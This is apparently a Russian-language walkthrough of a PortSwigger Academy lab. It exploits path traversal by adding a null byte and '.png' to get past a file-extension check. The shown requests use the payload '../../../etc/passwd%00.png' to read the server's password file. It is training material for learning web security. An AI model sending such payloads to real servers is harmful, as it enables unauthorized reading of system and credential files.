При загрузке веб-ресурса заметим, что идут отдельные GET запросы к веб-серверу и отправим данный запрос в repeater
```
GET /image?filename=71.jpg
```
![img](https://github.com/adyatlove/PortSwiggerAcademy/blob/main/3.%20Directory%20traversal/6.%20File%20path%20traversal%2C%20validation%20of%20file%20extension%20with%20null%20byte%20bypass/pics%20for%20walktrough/1.png)

Замечаем, что наш обычный payload для Path Traversal не подходит
```
GET /image?filename=../../../etc/passwd
```
![img](https://github.com/adyatlove/PortSwiggerAcademy/blob/main/3.%20Directory%20traversal/6.%20File%20path%20traversal%2C%20validation%20of%20file%20extension%20with%20null%20byte%20bypass/pics%20for%20walktrough/4.png)

Попробуем вставить нулевой бит `%00` с расширением `.png`, в конце нашего запроса, на случай, если разработчик использовал валидацию запросов по маске графических изображений - `%00.png`. Тем самым, для обработчика данный запрос будет обрабываться как 

`GET /image?filename=../../../etc/passwd%00.png` -> `GET /image?filename=../../../etc/passwd .png` -> `GET /image?filename=../../../etc/passwd`

![img](https://github.com/adyatlove/PortSwiggerAcademy/blob/main/3.%20Directory%20traversal/6.%20File%20path%20traversal%2C%20validation%20of%20file%20extension%20with%20null%20byte%20bypass/pics%20for%20walktrough/2.png)
